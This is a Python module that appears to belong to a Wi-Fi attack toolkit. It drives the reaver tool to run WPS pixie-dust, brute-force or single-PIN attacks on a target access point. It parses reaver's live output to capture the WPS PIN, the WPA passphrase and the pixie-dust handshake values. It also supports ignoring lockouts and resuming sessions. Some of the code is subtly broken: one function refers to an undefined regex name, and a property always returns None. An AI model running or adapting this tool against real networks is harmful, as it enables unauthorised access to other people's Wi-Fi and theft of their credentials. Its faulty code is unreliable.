"""Live WPS attack orchestration via reaver.

Drives ``reaver`` (t6x fork, https://github.com/t6x/reaver-wps-fork-t6x,
GPL-2.0) as a subprocess, streams and parses its verbose output in real
time, captures the pixie-dust values it prints, and optionally feeds them
straight into the offline solver.  Reaver handles the raw-802.11 layer
(monitor mode, association, WPS state machine); this module adds:

* clean command construction (pixie-dust / brute-force / single-PIN)
* live log parsing (rekey, WPS version, lockout, progress, PIN, PSK)
* extraction of PKE/PKR/E-Hash1/E-Hash2/AuthKey/E-Nonce from the
  ``executing pixiewps ...`` line for offline re-analysis
* session-file resume support (``reaver -s``)

Requires a Linux host with a monitor-mode interface and root privileges.
"""

from __future__ import annotations

import os
import re
import shlex
import shutil
import signal
import subprocess
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from . import crypto
from .wps import Capture

__all__ = ["AttackResult", "ReaverCtl", "reaver_available"]

# ---------------------------------------------------------------------------
# reaver verbose-output patterns (case-insensitive, tolerant of prefixes)
# ---------------------------------------------------------------------------

_RE_KEY = re.compile(r"rekey:\s*(yes|no)", re.I)
_RE_VERSION = re.compile(r"wps version:\s*([\d.]+)", re.I)
_RE_PIN = re.compile(r"wps\s+pin:\s*'?(<empty>|\d{8})'?", re.I)
_RE_PSK = re.compile(r"wpa[- ]?psk:\s*'?([0-9a-fA-F]{64})'?", re.I)
_RE_SSID = re.compile(r"(?:ap\s+ssid|ssid):\s*(\S.*)$", re.I)
_RE_TRYING = re.compile(r"trying\s+(\d{4,})\s*\((\d+)/(\d+)\)", re.I)
_RE_PXDCMD = re.compile(r"executing\s+pixiewps\b\s*(.*)$", re.I)
_RE_LOCKED = re.compile(r"(wps setup locked|locked out|lockout)", re.I)
_RE_CHANNEL = re.compile(r"channel:\s*(\d+)", re.I)
_RE_SIGNAL = re.compile(r"signal[^:]*:\s*(-?\d+)\s*dBm", re.I)
_RE_UUID = re.compile(r"uuid:\s*([0-9A-Fa-f-]{36})", re.I)

# pixiewps CLI tokens on the "executing pixiewps ..." line
_PX_TOKENS = {
    "-e": "pke", "--pke": "pke",
    "-r": "pkr", "--pkr": "pkr",
    "-s": "ehash1", "--e-hash1": "ehash1",
    "-z": "ehash2", "--e-hash2": "ehash2",
    "-a": "authkey", "--authkey": "authkey",
    "-n": "enonce", "--e-nonce": "enonce",
    "-m": "rnonce", "--r-nonce": "rnonce",
    "-b": "bssid", "--e-bssid": "bssid",
}
_HEX_LEN = {"pke": 192, "pkr": 192, "ehash1": 32, "ehash2": 32,
            "authkey": 32, "enonce": 16, "rnonce": 16, "bssid": 6}


def reaver_available() -> bool:
    return shutil.which("reaver") is not None


@dataclass
class AttackResult:
    """Outcome of a live reaver-driven attack."""

    ok: bool = False
    pin: Optional[str] = None
    psk_hex: Optional[str] = None
    ssid: Optional[str] = None
    rekey: Optional[bool] = None
    wps_version: Optional[str] = None
    locked: bool = False
    channel: Optional[int] = None
    attempts: int = 0
    attempts_max: int = 0
    duration: float = 0.0
    capture: Optional[Capture] = None     # pixie-dust values, if captured
    offline_pin: Optional[str] = None     # if the offline solver confirmed it
    log_lines: list = field(default_factory=list)
    returncode: Optional[int] = None
    error: Optional[str] = None

    @property
    def pin_hex(self) -> Optional[str]:
        return None


def _parse_pxd_command(line: str, capture: Capture) -> bool:
    """Populate ``capture`` from an 'executing pixiewps ...' line."""
    m = _PXDCMD.search(line)
    if not m:
        return False
    tokens = shlex.split(m.group(1))
    changed = False
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        name = _PX_TOKENS.get(tok)
        if name and i + 1 < len(tokens):
            val = tokens[i + 1]
            try:
                data = crypto.hex2bin(val, _HEX_LEN[name])
            except ValueError:
                i += 1
                continue
            setattr(capture, name, data)
            changed = True
            i += 2
        else:
            if tok in ("-S", "--dh-small"):
                capture.small_dh = True
                changed = True
            i += 1
    return changed


class ReaverCtl:
    """Run and monitor a reaver attack on one target."""

    def __init__(self, iface: str, bssid: str, mode: str = "pixie",
                 max_attempts: int = 0, delay: int = 1,
                 rx_timeout: Optional[int] = None,
                 m57_timeout: Optional[float] = None,
                 lock_delay: Optional[int] = None,
                 fail_wait: Optional[int] = None,
                 dh_small: bool = True,
                 channel: Optional[int] = None,
                 essid: Optional[str] = None,
                 pin: Optional[str] = None,
                 session: Optional[str] = None,
                 exec_cmd: Optional[str] = None,
                 ignore_locks: bool = False,
                 eap_terminate: bool = False,
                 no_nacks: bool = False,
                 extra_args: Optional[list[str]] = None,
                 reaver_bin: Optional[str] = None,
                 progress: Optional[Callable[[str], None]] = None):
        for k, v in (("iface", iface), ("bssid", bssid)):
            if not v:
                raise ValueError(f"{k} is required")
        if mode not in ("pixie", "bruteforce", "pin"):
            raise ValueError("mode must be pixie, bruteforce or pin")
        self.iface = iface
        self.bssid = bssid
        self.mode = mode
        self.max_attempts = max_attempts
        self.delay = delay
        self.rx_timeout = rx_timeout
        self.m57_timeout = m57_timeout
        self.lock_delay = lock_delay
        self.fail_wait = fail_wait
        self.dh_small = dh_small
        self.channel = channel
        self.essid = essid
        self.pin = pin
        self.session = session
        self.exec_cmd = exec_cmd
        self.ignore_locks = ignore_locks
        self.eap_terminate = eap_terminate
        self.no_nacks = no_nacks
        self.extra_args = list(extra_args or [])
        self.reaver_bin = reaver_bin or "reaver"
        self.progress = progress or (lambda m: None)
        self.result = AttackResult()

    # ------------------------------------------------------------------

    def build_command(self) -> list[str]:
        cmd = [self.reaver_bin, "-i", self.iface, "-b", self.bssid, "-vv"]
        if self.mode == "pin" and self.pin:
            cmd += ["-p", self.pin]
        elif self.mode == "pixie":
            cmd += ["-K"]  # --pixie-dust
            if self.dh_small:
                cmd += ["-S"]
        else:  # bruteforce
            if self.max_attempts:
                cmd += ["-g", str(self.max_attempts)]
            if self.dh_small:
                cmd += ["-S"]
        if self.mode != "pin" and self.delay is not None:
            cmd += ["-d", str(self.delay)]
        if self.rx_timeout is not None:
            cmd += ["-t", str(self.rx_timeout)]
        if self.m57_timeout is not None:
            cmd += ["-T", str(self.m57_timeout)]
        if self.lock_delay is not None:
            cmd += ["-l", str(self.lock_delay)]
        if self.fail_wait is not None:
            cmd += ["-x", str(self.fail_wait)]
        if self.channel is not None:
            cmd += ["-c", str(self.channel)]
        if self.essid:
            cmd += ["-e", self.essid]
        if self.session:
            cmd += ["-s", self.session]
        if self.exec_cmd:
            cmd += ["-C", self.exec_cmd]
        if self.ignore_locks:
            cmd += ["-L"]
        if self.eap_terminate:
            cmd += ["-E"]
        if self.no_nacks:
            cmd += ["-N"]
        cmd += self.extra_args
        return cmd

    # ------------------------------------------------------------------

    def _handle_line(self, line: str) -> None:
        r = self.result
        r.log_lines.append(line)
        m = _RE_KEY.search(line)
        if m:
            r.rekey = (m.group(1).lower() == "yes")
        m = _RE_VERSION.search(line)
        if m:
            r.wps_version = m.group(1)
        m = _RE_PSK.search(line)
        if m:
            r.psk_hex = m.group(1)
        m = _RE_PIN.search(line)
        if m:
            r.pin = None if m.group(1) == "<empty>" else m.group(1)
            r.ok = r.pin is not None
        m = _RE_SSID.search(line)
        if m and not r.ssid:
            r.ssid = m.group(1).strip()
        m = _RE_TRYING.search(line)
        if m:
            r.attempts = int(m.group(2))
            r.attempts_max = int(m.group(3))
        if _RE_LOCKED.search(line):
            r.locked = True
        m = _RE_CHANNEL.search(line)
        if m and r.channel is None:
            r.channel = int(m.group(1))
        if r.capture is None:
            r.capture = Capture()
        _parse_pxd_command(line, r.capture)
        self.progress(line)

    # ------------------------------------------------------------------

    def run(self, timeout: Optional[float] = None) -> AttackResult:
        """Execute the attack; returns an AttackResult.

        ``timeout`` (seconds, optional) bounds the whole run.  KeyboardInterrupt
        stops reaver gracefully (SIGINT, like the user would press Ctrl-C).
        """
        if not reaver_available() and shutil.which(self.reaver_bin) is None:
            raise RuntimeError(
                "reaver not found. Build/install it "
                "(https://github.com/t6x/reaver-wps-fork-t6x) and ensure a "
                "monitor-mode interface is up.")
        if os.geteuid() != 0:  # pragma: no cover - needs root to matter
            self.progress("[!] running without root; raw 802.11 may fail")

        cmd = self.build_command()
        self.progress("$ " + " ".join(cmd))
        t0 = time.time()
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1)
        try:
            assert proc.stdout is not None
            deadline = time.time() + timeout if timeout else None
            for line in proc.stdout:
                line = line.rstrip("\n")
                if not line:
                    continue
                self._handle_line(line)
                if deadline and time.time() > deadline:
                    self.progress(f"[!] timeout after {timeout:.0f}s, stopping")
                    break
                if self.result.ok and self.mode != "bruteforce":
                    # let reaver finish flushing its final lines briefly
                    time.sleep(0.2)
                    break
        except KeyboardInterrupt:
            self.progress("interrupted, sending SIGINT to reaver ...")
            proc.send_signal(signal.SIGINT)
        finally:
            try:
                proc.wait(timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
        self.result.returncode = proc.returncode
        self.result.duration = time.time() - t0
        if self.result.pin is None and proc.returncode not in (0, None):
            self.result.error = (
                f"reaver exited with code {proc.returncode} without a PIN")
        # A pixie run that failed inside reaver still leaves the pxD values
        # captured; the offline solver gets a second chance in `attack()`.
        return self.result
